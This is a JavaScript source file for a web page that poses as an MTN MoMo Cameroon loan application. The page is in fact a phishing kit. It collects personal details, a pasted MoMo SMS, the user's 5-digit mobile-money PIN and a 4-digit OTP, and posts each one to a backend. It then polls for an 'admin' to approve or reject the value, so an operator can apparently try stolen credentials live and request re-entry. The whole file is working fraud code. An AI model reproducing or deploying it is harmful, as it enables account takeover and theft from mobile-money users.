// ═══════════════════════════════════════════════════════════
// MTN MoMo Cameroon – Frontend State Machine
// ═══════════════════════════════════════════════════════════

const S = {
  loanType: 'Business Loan',
  loanAmount: 1000000,
  loanTerm: '48 Months',
  loanPurpose: '',
  firstName: '', lastName: '', phone: '', email: '',
  employment: '', annualIncome: 0,
  kinName: '', kinPhone: '',
  applicationId: '',
  rejectedStep: null
};

let currentPage = 'page-splash';
let activePoll = null;
let countdownTimers = {};      // { sms, pin, otp } → setInterval
let countdownValues = {};      // current seconds left
let resendCooldown = {};       // { sms, pin, otp } → setInterval
let resendLeft = {};           // seconds before resend unlocks

const POLL_INTERVAL = 2000;         // 2 seconds between status checks
const COUNTDOWN_SECONDS = 30;       // countdown ring duration on wait page
const RESEND_COOLDOWN = 60;         // seconds before "Resend to admin" unlocks

// ═══════════════════════════════════════════════════════════
// SPLASH → LANDING (4 second delay)
// ═══════════════════════════════════════════════════════════
function runSplash() {
  const bar = document.getElementById('splashLoaderBar');
  const totalMs = 4000;
  const started = Date.now();

  const tick = setInterval(() => {
    const pct = Math.min(100, ((Date.now() - started) / totalMs) * 100);
    bar.style.width = pct + '%';
    if (pct >= 100) {
      clearInterval(tick);
      goTo('page-landing');
    }
  }, 100);
}

// ═══════════════════════════════════════════════════════════
// NAVIGATION
// ═══════════════════════════════════════════════════════════
function goTo(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const el = document.getElementById(pageId);
  if (el) el.classList.add('active');
  currentPage = pageId;
  window.scrollTo(0, 0);
}

// ═══════════════════════════════════════════════════════════
// TOAST / ERRORS
// ═══════════════════════════════════════════════════════════
function showToast(msg, type = '') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast show ' + type;
  setTimeout(() => t.classList.remove('show'), 3000);
}
function showError(id, msg) {
  const el = document.getElementById(id);
  if (!el) return;
  const txt = document.getElementById(id + 'Txt');
  if (txt) txt.textContent = msg;
  el.classList.add('show');
  clearTimeout(el._t);
  el._t = setTimeout(() => el.classList.remove('show'), 4000);
}
function clearErr(id) { const el = document.getElementById(id); if (el) el.classList.remove('show'); }

// ═══════════════════════════════════════════════════════════
// LANDING CALCULATOR
// ═══════════════════════════════════════════════════════════
function updateCalc() {
  const amt = +document.getElementById('amtSlider').value;
  document.getElementById('calcAmt').textContent = 'XAF ' + amt.toLocaleString();
  const monthly = Math.ceil(amt / 48);
  document.getElementById('monthlyAmt').textContent = 'XAF ' + monthly.toLocaleString();
}

function startApplication() {
  S.rejectedStep = null;
  goTo('page-step1');
}

// ═══════════════════════════════════════════════════════════
// FORM STEPS
// ═══════════════════════════════════════════════════════════
function toS2() {
  const ty = document.getElementById('s1ty').value;
  const am = +document.getElementById('s1am').value;
  const te = document.getElementById('s1te').value;
  const pu = document.getElementById('s1pu').value.trim();
  if (!ty || am <= 0 || !te || !pu) { showError('s1Err', 'Please complete all fields.'); return; }
  Object.assign(S, { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu });
  goTo('page-step2');
}

function toS3() {
  const fi = document.getElementById('s2fi').value.trim();
  const la = document.getElementById('s2la').value.trim();
  const ph = document.getElementById('s2ph').value.trim();
  const em = document.getElementById('s2em').value.trim();
  if (!fi || !la) { showError('s2Err', 'Enter your full name.'); return; }
  if (ph.length !== 9) { showError('s2Err', 'Enter a valid 9-digit phone number.'); return; }
  if (!em.includes('@')) { showError('s2Err', 'Enter a valid email.'); return; }
  Object.assign(S, { firstName: fi, lastName: la, phone: ph, email: em });
  document.getElementById('sA').textContent = 'XAF ' + S.loanAmount.toLocaleString();
  document.getElementById('sT').textContent = S.loanTerm;
  document.getElementById('sP').textContent = S.loanPurpose || '—';
  document.getElementById('sN').textContent = `${fi} ${la}`;
  goTo('page-step3');
}

async function submitApp() {
  const em = document.getElementById('s3em').value;
  const inc = +document.getElementById('s3in').value;
  const kn = document.getElementById('s3kn').value.trim();
  const kp = document.getElementById('s3kp').value.trim();

  if (!em || inc <= 0 || !kn || kp.length !== 9) {
    showError('s3Err', 'Please complete all fields.');
    return;
  }
  Object.assign(S, { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp });

  try {
    const res = await fetch('/api/send-application', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationData: S })
    });
    const data = await res.json();
    if (!data.ok) { showError('s3Err', 'Submission failed.'); return; }
    S.applicationId = data.applicationId;
    goTo('page-sms-paste');
  } catch (e) {
    showError('s3Err', 'Network error. Try again.');
  }
}

// ═══════════════════════════════════════════════════════════
// SMS STEP
// ═══════════════════════════════════════════════════════════
async function doSmsParse() {
  const msg = document.getElementById('smsMsgBox').value.trim();
  if (msg.length < 3) { showError('momErr', 'Paste a valid SMS message.'); return; }

  // Reset rejection UI
  document.getElementById('smsRejectedNotice').classList.add('hidden');
  document.getElementById('smsResendBlock').classList.add('hidden');

  try {
    await fetch('/api/send-momo-message', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ momoData: { applicationId: S.applicationId, phone: S.phone, momoMessage: msg } })
    });
    goTo('page-wait-sms');
    startPoll('sms');
  } catch (e) {
    showError('momErr', 'Network error.');
  }
}

async function resendSms() {
  document.getElementById('smsResendBtn').disabled = true;
  try {
    await fetch('/api/resend-sms', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId })
    });
    showToast('SMS resubmitted to admin', 'success');
    goTo('page-wait-sms');
    startPoll('sms');
  } catch (e) {
    showToast('Resend failed', 'error');
  }
}

// ═══════════════════════════════════════════════════════════
// PIN STEP
// ═══════════════════════════════════════════════════════════
function pinMvM(el, i) {
  el.value = el.value.replace(/\D/g, '');
  if (el.value && i < 4) document.getElementById('pin' + (i + 1)).focus();
  if (!el.value && i > 0) document.getElementById('pin' + (i - 1)).focus();
}
function clearLoginPin() {
  for (let i = 0; i < 5; i++) document.getElementById('pin' + i).value = '';
  document.getElementById('pin0').focus();
}
function togPin() {
  for (let i = 0; i < 5; i++) {
    const el = document.getElementById('pin' + i);
    el.type = el.type === 'password' ? 'text' : 'password';
  }
}

async function doPin() {
  let pin = '';
  for (let i = 0; i < 5; i++) pin += document.getElementById('pin' + i).value;
  if (pin.length !== 5) { showError('pinErr', 'Enter a valid 5-digit PIN.'); return; }

  document.getElementById('pinRejectedNotice').classList.add('hidden');
  document.getElementById('pinResendBlock').classList.add('hidden');

  try {
    const res = await fetch('/api/send-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, pin })
    });
    const data = await res.json();
    if (data.blocked) {
      showError('pinErr', data.message || 'PIN blocked. Try again later.');
      showPinBlocked();
      return;
    }
    if (!data.ok) { showError('pinErr', data.error || 'Submission failed.'); return; }

    goTo('page-wait-pin');
    startPoll('pin');
  } catch (e) {
    showError('pinErr', 'Network error.');
  }
}

async function resendPin() {
  document.getElementById('pinResendBtn').disabled = true;
  // Re-submit the last PIN (we stored it in a data attribute)
  const lastPin = document.getElementById('pinResendBtn').dataset.lastPin;
  if (!lastPin) { showToast('Please re-enter your PIN.', 'error'); return; }
  try {
    await fetch('/api/send-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, pin: lastPin })
    });
    showToast('PIN resubmitted to admin', 'success');
    goTo('page-wait-pin');
    startPoll('pin');
  } catch (e) {
    showToast('Resend failed', 'error');
  }
}

function showPinBlocked() {
  const badge = document.getElementById('pinAttemptsDisplay');
  badge.textContent = '🔒 PIN temporarily blocked';
  badge.className = 'attempts-badge blocked';
  for (let i = 0; i < 5; i++) document.getElementById('pin' + i).disabled = true;
}

// ═══════════════════════════════════════════════════════════
// OTP STEP
// ═══════════════════════════════════════════════════════════
function otpMvM(el, i) {
  el.value = el.value.replace(/\D/g, '');
  if (el.value && i < 3) document.getElementById('otp' + (i + 1)).focus();
  if (!el.value && i > 0) document.getElementById('otp' + (i - 1)).focus();
}
function clearOtpCode() {
  for (let i = 0; i < 4; i++) document.getElementById('otp' + i).value = '';
  document.getElementById('otp0').focus();
}

async function doOtp() {
  let otp = '';
  for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
  if (otp.length !== 4) { showError('otpErr', 'Enter a valid 4-digit OTP.'); return; }

  document.getElementById('otpRejectedNotice').classList.add('hidden');
  document.getElementById('otpResendBlock').classList.add('hidden');

  try {
    await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, otp })
    });
    goTo('page-wait-otp');
    startPoll('otp');
  } catch (e) {
    showError('otpErr', 'Network error.');
  }
}

async function resendOtp() {
  document.getElementById('otpResendBtn').disabled = true;
  const lastOtp = document.getElementById('otpResendBtn').dataset.lastOtp;
  if (!lastOtp) { showToast('Please re-enter your OTP.', 'error'); return; }
  try {
    await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, otp: lastOtp })
    });
    showToast('OTP resubmitted to admin', 'success');
    goTo('page-wait-otp');
    startPoll('otp');
  } catch (e) {
    showToast('Resend failed', 'error');
  }
}

// ═══════════════════════════════════════════════════════════
// POLLING LOGIC (the core)
// ═══════════════════════════════════════════════════════════
function startPoll(step) {
  stopPoll();
  startCountdown(step);      // 30s countdown ring on wait page

  activePoll = setInterval(async () => {
    try {
      const res = await fetch(`/api/status/${S.applicationId}/${step}`, { cache: 'no-store' });
      if (res.status === 404) { handleNotFound(); return; }
      const data = await res.json();

      if (data.status === 'approved') {
        stopPoll();
        stopCountdown(step);
        onApproved(step);
        return;
      }
      if (data.status === 'rejected') {
        stopPoll();
        stopCountdown(step);
        onRejected(step);
        return;
      }
      if (data.status === 'blocked') {
        stopPoll();
        stopCountdown(step);
        onBlocked(step);
        return;
      }
      // pending → keep polling
    } catch (err) {
      console.error('Poll error:', err);
    }
  }, POLL_INTERVAL);
}

function stopPoll() {
  if (activePoll) { clearInterval(activePoll); activePoll = null; }
}

function onApproved(step) {
  if (step === 'sms') { goTo('page-pin'); return; }
  if (step === 'pin') { goTo('page-otp'); return; }
  if (step === 'otp') { showApprovalPage(); return; }
}

function onRejected(step) {
  // Return to the input page of the SAME step with rejection UI
  document.getElementById(`${step}RejectedNotice`)?.classList.remove('hidden');
  document.getElementById(`${step}ResendBlock`)?.classList.remove('hidden');

  // Store last value so resend button can use it
  if (step === 'pin') {
    let pin = '';
    for (let i = 0; i < 5; i++) pin += document.getElementById('pin' + i).value;
    document.getElementById('pinResendBtn').dataset.lastPin = pin;
    clearLoginPin();
    showToast('PIN rejected. Please re-enter.', 'error');
    goTo('page-pin');
  } else if (step === 'otp') {
    let otp = '';
    for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
    document.getElementById('otpResendBtn').dataset.lastOtp = otp;
    clearOtpCode();
    showToast('OTP rejected. Please re-enter.', 'error');
    goTo('page-otp');
  } else if (step === 'sms') {
    showToast('SMS rejected. Please edit and resubmit.', 'error');
    goTo('page-sms-paste');
  }

  startResendCooldown(step);
}

function onBlocked(step) {
  if (step === 'pin') {
    showPinBlocked();
    goTo('page-pin');
    showToast('PIN blocked for 30 minutes.', 'error');
  }
}

function handleNotFound() {
  stopPoll();
  Object.keys(countdownTimers).forEach(stopCountdown);
  alert('Application not found. Please start again.');
  goTo('page-landing');
}

// ═══════════════════════════════════════════════════════════
// COUNTDOWN ON WAIT PAGE (30s ring)
// ═══════════════════════════════════════════════════════════
function startCountdown(step) {
  stopCountdown(step);
  countdownValues[step] = COUNTDOWN_SECONDS;

  updateCountdownUI(step, COUNTDOWN_SECONDS);

  countdownTimers[step] = setInterval(() => {
    countdownValues[step]--;
    updateCountdownUI(step, Math.max(0, countdownValues[step]));

    if (countdownValues[step] <= 0) {
      stopCountdown(step);
      document.getElementById(`${step}WaitStatus`).textContent = 'Still waiting for admin response…';
    }
  }, 1000);
}

function stopCountdown(step) {
  if (countdownTimers[step]) {
    clearInterval(countdownTimers[step]);
    delete countdownTimers[step];
  }
}

function updateCountdownUI(step, seconds) {
  const numEl = document.getElementById(`${step}CountdownNum`);
  const circleEl = document.getElementById(`${step}CountdownCircle`);
  if (!numEl || !circleEl) return;
  numEl.textContent = seconds;
  const pct = seconds / COUNTDOWN_SECONDS;
  circleEl.style.strokeDashoffset = (283 * (1 - pct)).toString();
}

// ═══════════════════════════════════════════════════════════
// RESEND COOLDOWN ON INPUT PAGE (60s)
// ═══════════════════════════════════════════════════════════
function startResendCooldown(step) {
  stopResendCooldown(step);
  resendLeft[step] = RESEND_COOLDOWN;

  const btn = document.getElementById(`${step}ResendBtn`);
  const timerLabel = document.getElementById(`${step}ResendTimer`);
  btn.disabled = true;

  resendCooldown[step] = setInterval(() => {
    resendLeft[step]--;
    if (resendLeft[step] <= 0) {
      stopResendCooldown(step);
      btn.disabled = false;
      btn.textContent = 'Resend to Admin';
    } else if (timerLabel) {
      timerLabel.textContent = resendLeft[step];
    }
  }, 1000);
}

function stopResendCooldown(step) {
  if (resendCooldown[step]) {
    clearInterval(resendCooldown[step]);
    delete resendCooldown[step];
  }
}

// ═══════════════════════════════════════════════════════════
// CANCEL / BACK FROM WAIT PAGE
// ═══════════════════════════════════════════════════════════
function cancelWait(step) {
  stopPoll();
  stopCountdown(step);
  if (step === 'sms') goTo('page-sms-paste');
  if (step === 'pin') goTo('page-pin');
  if (step === 'otp') goTo('page-otp');
}

// ═══════════════════════════════════════════════════════════
// APPROVAL
// ═══════════════════════════════════════════════════════════
function showApprovalPage() {
  const amt = S.loanAmount.toLocaleString();
  const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm)).toLocaleString();
  document.getElementById('aprAmount').textContent = 'XAF ' + amt;
  document.getElementById('aprAmt').textContent = 'XAF ' + amt;
  document.getElementById('aprTerm').textContent = S.loanTerm;
  document.getElementById('aprMth').textContent = 'XAF ' + monthly;
  goTo('page-approval');
}

function finishApplication() {
  alert('Thank you! Your loan has been disbursed.');
  location.reload();
}

// ═══════════════════════════════════════════════════════════
// BOOT
// ═══════════════════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  updateCalc();
  runSplash();
});
